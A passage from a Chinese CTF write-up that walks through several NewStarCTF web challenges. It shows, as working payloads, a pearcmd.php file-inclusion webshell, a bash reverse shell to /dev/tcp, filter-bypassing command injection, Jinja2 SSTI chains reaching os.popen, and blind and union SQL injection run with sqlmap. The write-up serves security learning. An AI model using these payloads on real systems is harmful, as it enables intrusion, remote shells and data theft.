<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  发现并没有读取到&quot;index.php&quot;，因此还是不能做到截断的。</span><br><span class="line">  </span><br><span class="line">* 翻了好久的&quot;LFI via RCE&quot;，在P佬的 [Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) 中找到了可行的思路，利用Dcoker中自动安装的&quot;/usr/local/lib/pearcmd.php&quot;文件与Docker环境下自动开启的&quot;register_argc_argv&quot;配置，用请求传入CLI，访问PHP扩展管理工具&quot;pecl&quot;来实现任意文件写。</span><br><span class="line"></span><br><span class="line">  pecl中有一个命令是 `config-create contents filePath` ，它可以在权限范围内将&quot;contents&quot;写入指定路径的文件中。</span><br><span class="line"></span><br><span class="line">  能成功写入文件的payload：</span><br><span class="line"></span><br><span class="line">  ```php</span><br><span class="line">  ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

写入成功后CLI的回显也会相应打回前端。接着访问&quot;/tmp/hello.php&quot;：

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?file=/tmp/hello</span><br><span class="line"></span><br><span class="line">-&gt;<span class="comment">#PEAR_Config 0.9 a:12:&#123;s:7:&quot;php_dir&quot;;s:62:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php&quot;;s:8:&quot;data_dir&quot;;s:63:&quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?...</span></span><br></pre></td></tr></table></figure></div>

会发现 `phpinfo()` 并没有成功执行。一开始没意识到是为什么，查询了wp后发现是因为发送HTTP请求时，尖括号进行了URL编码。由于argv将直接读取传入的内容作为CLI参数，因此被URL编码的尖括号并未被URL解码就作为参数传给了pecl工具，于是写入文件的就从 `&lt;?=phpinfo()?&gt;` 变成了 `%3C?=phpinfo()?%3E` ，因此php命令就失效了，这个在访问hello.php时其实可以看得出来（虽然没意识到是这么一回事）。由于在发送HTTP请求时，不论是什么shell都会进行URL编码，因此切换工具是不行的（包括但不限于Python的request库，浏览器，hackbar，curl），只能用burp抓取已经发送的包进行修改，还原被URL编码的字符再发送才能成功。

最后getshell的payload：

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_GET[%27shell%27])?%3E+/tmp/shell.php</span><br><span class="line"></span><br><span class="line">?file=/tmp/shell&amp;shell=system(&#x27;cat /f*&#x27;);</span><br><span class="line"></span><br><span class="line">-&gt;flag&#123;8438c22d-d66c-4fc3-848e-4677ac90d5d7&#125;</span><br></pre></td></tr></table></figure></div>

 使用burp的&quot;url-decode&quot;时，原本的&quot;+&quot;会被解码成某种空白字符，它会导致请求400；太久没写php了，忘记执行函数要套上 `system()` ，还捣鼓了半天（=\_=），这里也可以反弹shell：`?file=/tmp/shell&amp;shell=system(&#39;bash -c &quot;bash -i &gt;%26 /dev/tcp/ip/port 0&gt;&amp;261&quot;&#39;);` 。受到之前url编码的影响，我以为反弹shell的时候也要避开url编码，却发现这样的话 `&amp;` 符号就不知如何处理，但实际上这个参数由php接收，它是会被url解码的，因此不需要考虑特殊字符的问题，同时 `$_GET` 与 `$_POST` 也都是可以的。 

对于 `&amp;` 字符，它除了被URL编码之外，都将被识别为不同参数的分界符，这是由URL的语法分析原则决定的。
</code></pre>
</li>
<li><p>关于P神的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+&amp;file=/usr/local/lib/php/pearcmd+&amp;/&lt;?=phpinfo();?&gt;+/tmp/pinfo.php</span><br><span class="line"></span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p>上方的payload不能成功写入文件，这是我一开始写的，下方的是P神的payload，因此我突然发现P神的payload很有意思。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">RFC3875中规定，如果query-string中不包含没有编码的=，且请求是GET或HEAD，则query-string需要被作为命令行参数。</span><br><span class="line">PHP中即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[&#x27;argv&#x27;]</span><br></pre></td></tr></table></figure></div>

<p>传入的请求参数若不赋予其值，则会被当做命令行参数处理，前提是开启了 <code>register_argc_argv</code> 选项。因此实际执行的命令是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+config-create+/file/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></div>

<p><code>+</code> 代替空格。相当于往 <code>/tmp/hello.php</code> 文件中写入了  <code>/file/&lt;?=phpinfo()?&gt;</code> 内容。其中 <code>&lt;?=</code> 是标签 <code>&lt;?php echo</code> 的简写，即写入了 <code>&lt;?php echo phpinfo()?&gt;</code> ，可以没有分号，语句也能正常执行。</p>
<hr>
<p>开头的空格</p>
<p>开一个Docker的PHP环境来测试：</p>
</li>
</ul>
<h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">17</span>:<span class="string">&quot;first\second\user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;456&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>php调用父类构造方法：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br></pre></td></tr></table></figure></div>

<p>网上找的EXP跑不了，直接看了WP，发现人家的EXP也是来自网上</p>
<p>有用的：<a class="link"   href="https://blog.csdn.net/mochu7777777/article/details/127152796" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>， <a class="link"   href="https://www.freebuf.com/vuls/263977.html" >EXP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>实际上该EXP本身就需要请求参数来作为RCE的参数。调用链条的最后来到Request.php中的 <code>param</code> 函数，此处调用了 <code>input()</code> 函数，并选取 <code>$this-&gt;param</code> 作为最终回调函数的参数，也就是说任意Request类的该参数是RCE的参数。该参数实际上是请求中以GET方式传入的首个任意内容，如：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">?a=id</span><br><span class="line">?id=ls</span><br><span class="line">?k=pwd&amp;ac=ls	// 执行pwd</span><br></pre></td></tr></table></figure></div>

<p>但 <code>?=id</code> 不行</p>
<h4 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h4><p><code>explode(&quot; &quot;, &quot;a b cd e&quot;)</code> ：Break a string into an array &#x3D;&gt; <code>[a, b, cd, e]</code></p>
<hr>
<p>最终flag在环境变量中：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;3de1b876-591e-46bf-b4b7-b239a6995f05&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="WEB-Week4"><a href="#WEB-Week4" class="headerlink" title="WEB-Week4"></a>WEB-Week4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p><a class="link"   href="https://blog.csdn.net/qq_41315957/article/details/118855865" >RCE姿势 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h4><p><code>et</code> ：<a class="link"   href="https://blog.csdn.net/yhj_911/article/details/125302051" >Linux下打开WPS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>base</code> ：<a class="link"   href="https://www.cnblogs.com/JasonCeng/p/15741335.html" >base64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ls</span><br><span class="line"></span><br><span class="line">=&gt;bin boot dev etc ffffllllaaaaggggg home lib lib64 media mnt opt proc root run sbin srv start.<span class="property">sh</span> sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26cd%<span class="number">09.</span>.%<span class="number">26</span>%26ca$9t%09fff??<span class="function"><span class="params">lllaaaaggggg</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">=&gt;</span> flag&#123;8585f43d-3a99-407a-af1f-64fcdbdf600d&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>过滤了”fl”与”*“，用通配符”?”绕过；</li>
<li>空格用 <code>%09</code> 或 <code>\$&#123;IFS&#125;</code> 或 <code>\$IFS\$9</code> </li>
<li>过滤字符用空字符连接绕过，<code>$9</code> 未被定义自动为空，连接在cat中间依然表示cat</li>
<li>根目录 <code>/</code> 被过滤用 <code>cd ..</code> 绕过</li>
<li><code>;</code> 被过滤，多命令顺序执行用 <code>&amp;&amp;</code> 绕过</li>
</ol>
<h3 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h3><p><a class="link"   href="https://zhuanlan.zhihu.com/p/98788776" >Django入门 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><em>也许最简单的初始方法是通过注入模板表达式中常用的特殊字符序列来使模板模糊，例如 <code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>。如果引发异常，则表明服务器可能以某种方式解释了注入的模板语法。这表明服务器端模板注入可能存在漏洞。</em></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">3</span>].__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>枚举子类名称，过滤了双引号用单引号替代</p>
<p><code>a.__getattr__(&quot;b&quot;) == a.b == getattr(&quot;b&quot;)</code> </p>
<p><code>a.__sub__(4) == a[4]</code> </p>
<p><code>a.__class__ == a[&quot;__class__&quot;]</code> 目前只有在flask模板注入时发现该语句，在本地测试中py2与py3都不支持该语法，这更像是Js的对象读取。</p>
<p>利用burp爆破枚举子类，寻找有用的类，最终得到os函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27popen%<span class="number">27</span>).__name__&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>在子类中找到了”Quitter”，获取其构造函数后利用 <code>__globals__</code> 读取函数所在文件对应全局变量的值，读取时发现 <code>__builtins__</code> 中存在 <code>__import__</code> ，获取到该函数并导入 <code>os</code> 。由于 <code>system</code> 被过滤，利用模板渲染时python的语法解析特点，获取到system函数并实现RCE，但是 <code>system</code> 函数无法获取cmd返回值，且反弹shell由于存在空格惨遭过滤，因此改用 <code>os.popen().read()</code> 函数执行RCE：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%27more%09/%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; app <span class="built_in">bin</span> boot dev etc flag_in_h3r3_52daad home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure></div>

<p>过滤的空格用 <code>%09</code> 或 <code>$&#123;IFS&#125;</code> 或 <code>$IFS$9</code> 绕过，cat被过滤用nl或more</p>
<p>爬取源码app.py：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;CTFer&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.findall(<span class="string">&#x27;class|init|mro|subclasses|flag|cat|env|&quot;|eval|system|popen|globals|builtins|\+| |attr|\~&#x27;</span>, name): </span><br><span class="line">        t = Template(<span class="string">&quot;Welcome to NewStarCTF Again, Dear &quot;</span> + name + <span class="string">&quot;Try to GET me a NAME&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> t.render() </span><br><span class="line">    <span class="keyword">else</span>: t = Template(<span class="string">&quot;Get Out!Hacker!&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> t.render() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>

<p>“flag”惨遭过滤，用base64编码绕过：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ <span class="built_in">echo</span> <span class="string">&quot;cat /flag_in_h3r3_52daad&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==</span><br></pre></td></tr></table></figure></div>

<p>payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> \&#x27;Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg==\&#x27; | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></div>

<p>得到EXP：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">http://5b284995-a3cd-<span class="number">4920</span>-9a46-0f75ee461f54.node4.buuoj.cn:<span class="number">81</span>/?name=&#123;&#123;%<span class="number">271</span>%<span class="number">27</span>[%27__CLASS__%<span class="number">27.</span>lower()][%27__BASE__%<span class="number">27.</span>lower()][%27__SUBCLASSES__%<span class="number">27.</span>lower()]()[<span class="number">118</span>][%27__INIT__%<span class="number">27.</span>lower()][%27__GLOBALS__%<span class="number">27.</span>lower()][%27__BUILTINS__%<span class="number">27.</span>lower()][%27__IMPORT__%<span class="number">27.</span>lower()](%27os%<span class="number">27</span>)[%27POPEN%<span class="number">27.</span>lower()](%<span class="number">27</span>%60echo$&#123;IFS&#125;%5C%27Y2F0IC9mbGFnX2luX2gzcjNfNTJkYWFkCg%3D%3D%5C%<span class="number">27</span>$&#123;IFS&#125;%7C$&#123;IFS&#125;base64$&#123;IFS&#125;-d%<span class="number">60</span>%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; flag&#123;48a07e3e-0a4b-444a-<span class="number">8010</span>-8de01a894d64&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于之前忽略了 <code>/</code> 导致以为通配符不行。实际上payload：<code>tail$&#123;IFS&#125;/fla*</code> 也可以，支持通配符</p>
<h3 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h3><h4 id="Insert注入"><a href="#Insert注入" class="headerlink" title="Insert注入"></a>Insert注入</h4><p>经测试可以使用 <a class="link"   href="https://blog.csdn.net/Bossfrank/article/details/131337894" >Insert注入与Sqlmap的Post注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>pyaload；</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">794</span><span class="string">&#x27; and if(ascii(substr(database(), 1, 1))&gt;65, sleep(4), 1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>此处的and改成or会注入失败，可能是or后的语句没执行。该payload放在 <code>say.php</code> 中的任意一个框中提交都能注入成功，利用时间盲注即可获得数据库信息。</p>
<hr>
<p>手注太麻烦，试着用sqlmap来自动注入，由于此处是一个POST注入，可以使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php --data=<span class="string">&quot;user=1&amp;name=1&amp;comment=1&quot;</span> -p <span class="string">&quot;user&quot;</span> --current-db --technique T --delay=0.1 --time-sec 3 --level=3 --risk=2</span><br></pre></td></tr></table></figure></div>

<p>​		<code>-u</code> 指定目标url，<code>--data</code> 指定post内容，<code>-p</code> 指定注入参数，<code>--current-db</code> 指定获取当前数据库信息，<code>--technique T</code> 指定使用时间盲注，<code>--delay=0.1</code> 指定发包间隔为0.1s，<code>time-sec 3</code> 指定时间盲注的延迟时间为3s，<code>--level=3</code> 指定注入等级为3，<code>--risk=2</code> 指定风险等级为2（高风险等级可以使用更具破坏性的payload，如与Update、Delete有关的），但是这个payload不论如何调整都注不出结果。<em>这可能是因为sqlmap的直接Post注入会漏掉一些请求</em>（补充：实际上是因为没加UA），结合Burp的包来注入能解决这个问题。</p>
<p>​		使用Burp抓取Post请求包并保存为Txt文本文件：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/say.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn:81/say.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">user</span>=<span class="number">123</span>&amp;name=<span class="number">123</span>&amp;comment=<span class="number">123</span></span></span><br></pre></td></tr></table></figure></div>

<p>使用 <code>-r</code> 参数指定sqlmap从文件中获取Http请求，payload如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r package.txt --dbs</span><br></pre></td></tr></table></figure></div>

<p>sqlmap会确定如下注入点：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Parameter: name (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: user=123&amp;name=123<span class="string">&#x27; AND (SELECT 8459 FROM (SELECT(SLEEP(5)))lyAw) AND &#x27;</span>FPWb<span class="string">&#x27;=&#x27;</span>FPWb&amp;comment=123</span><br></pre></td></tr></table></figure></div>

<p><code>--dbs</code> 获取目标所有数据库名称，能够得到如下信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">web application technology: OpenResty</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">...</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] wfy</span><br><span class="line">fetched data logged to text files under <span class="string">&#x27;/home/sam/.local/share/sqlmap/output/fbe9e82d-3336-45a3-84a0-755e4355b610.node4.buuoj.cn&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到四个数据库名称，依据newstar惯例，尝试获取wfy数据库的信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1</span><br><span class="line"></span><br><span class="line">-&gt; </span><br><span class="line">Database: wfy</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">| wfy_admin       |</span><br><span class="line">| wfy_comments    |</span><br><span class="line">| wfy_information |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure></div>

<p>查看表 <code>wfy_comments</code> 的字段内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments --columns</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">Database: wfy</span><br><span class="line">Table: wfy_comments</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+--------------+</span><br><span class="line">| Column  | Type         |</span><br><span class="line">+---------+--------------+</span><br><span class="line">| name    | varchar(255) |</span><br><span class="line">| text    | text         |</span><br><span class="line">| user    | varchar(255) |</span><br><span class="line">| display | tinyint(1)   |</span><br><span class="line">| <span class="built_in">id</span>      | int(11)      |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure></div>

<p>依据提示，flag应该藏在text中，且在 <code>user=f1ag_is_here</code> 处，dump表内容：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt  -D wfy --tables --delay=0.1 -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&#x27;user=&quot;f1ag_is_here&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| text                           |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| flag&#123;We_0nly_have_2wo_choices&#125; |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>来自大佬WP的payload2：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.tables<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_schema<span class="operator">=</span>database()),<span class="number">2</span>;</span><br><span class="line">#爆列名</span><br><span class="line">name<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.columns<span class="operator">%</span><span class="number">0</span>bwhere<span class="operator">%</span><span class="number">0</span>btable_name<span class="operator">=</span><span class="string">&#x27;wfy_comments&#x27;</span>),<span class="number">2</span>;</span><br><span class="line"># 爆字段</span><br><span class="line"><span class="number">-1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(id,text,<span class="keyword">user</span>,name,display)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bwfy_comments<span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b0,<span class="number">1</span>),<span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>直接在查询中注入。过滤的是空格，用 <code>%0b</code> 绕过，这是竖直制表符”Vertical Tab”。关键词 <code>union, select, group_concat, from</code> 等等都没被过滤。通过联合查询注入即可取得flag。</p>
<p>自己尝试复现注入思路：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span>; # 拿不到数据库名</span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>bgroup_concat(schema_name)<span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>binformation_schema.schemata),<span class="number">2</span>; # 也拿不到数据库名</span><br></pre></td></tr></table></figure></div>

<p>上述payload是注入成功了（查询成功）但拿不到内容，原因是查询结果实际上是两行，只显示了第一行也就是本来的查询结果（虽然这里是空，因为库内的内容就是空），因此需要想办法获取到第二行的内容，有两种办法，一种是让第一行不见，如查询不存在的记录，把 <code>1</code> 改成 <code>-1</code> 或 <code>0</code> ；第二种是强行显示第二行的内容，加上 <code>limit%0b1,1</code> ：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>bdatabase(),<span class="number">2</span><span class="operator">%</span><span class="number">0</span>blimit<span class="operator">%</span><span class="number">0</span>b1,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> 